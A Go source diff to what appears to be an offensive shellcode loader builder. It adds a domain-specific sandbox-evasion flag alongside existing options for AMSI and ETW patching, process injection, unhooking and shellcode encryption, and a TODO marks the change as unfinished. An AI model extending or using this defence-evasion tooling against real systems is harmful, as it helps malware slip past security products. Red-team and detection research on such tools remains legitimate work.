@@ -35,6 +35,7 @@ type FlagOptions struct {
 	console          bool
 	refresher        bool
 	sandbox          bool
+	sandboxDomain    string
 	sleep            bool
 	path             string
 }
@@ -65,10 +66,11 @@ func options() *FlagOptions {
 	configfile := flag.String("configfile", "", "The path to a json based configuration file to generate custom file attributes. This will not use the default ones.")
 	valid := flag.String("valid", "", "The path to a valid code signing cert. Used instead -domain if a valid code signing cert is desired.")
 	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainJoined calls.`)
+	sandboxDomain := flag.String("sandboxDomain", "", `Enables a domain specific sandbox evasion using IsDomainJoined. Use in conjunction with sandbox flag.`)
 	sleep := flag.Bool("nosleep", false, `Disables the sleep delay before the loader unhooks and executes the shellcode.`)
 	path := flag.String("outpath", "", "The path to put the final Payload/Loader once it's compiled.")
 	flag.Parse()
-	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, AMSI: *AMSI, ETW: *ETW, Sha: *Sha, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sleep: *sleep, path: *path}
+	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, AMSI: *AMSI, ETW: *ETW, Sha: *Sha, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sandboxDomain: *sandboxDomain, sleep: *sleep, path: *path}
 }
 
 func execute(opt *FlagOptions, name string) string {
@@ -185,6 +187,10 @@ func main() {
 		log.Fatal("Error: Please provide a password for the valid code signing certificate")
 	}
 
+	if opt.sandbox == false && opt.sandboxDomain != "" {
+		log.Fatal("Error: Please provide the sandbox flag as well if you want to sandbox based on a domain name.")
+	}
+
 	if opt.ProcessInjection != "" && (opt.ETW == true || opt.AMSI == true) {
 		fmt.Println("[!] Currently ETW and AMSI patching only affects the parent process not the injected process")
 	}
@@ -219,7 +225,8 @@ func main() {
 	b64key := base64.StdEncoding.EncodeToString(key)
 	b64iv := base64.StdEncoding.EncodeToString(iv)
 	fmt.Println("[+] Shellcode Encrypted")
-	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection, opt.sleep, opt.AMSI)
+	//TODO modify CompileFile and Loader to include opt.sandboxDomain
+	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.sandboxDomain, opt.ETW, opt.ProcessInjection, opt.sleep, opt.AMSI)
 	name = execute(opt, name)
 	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.Sha, opt.path)
 
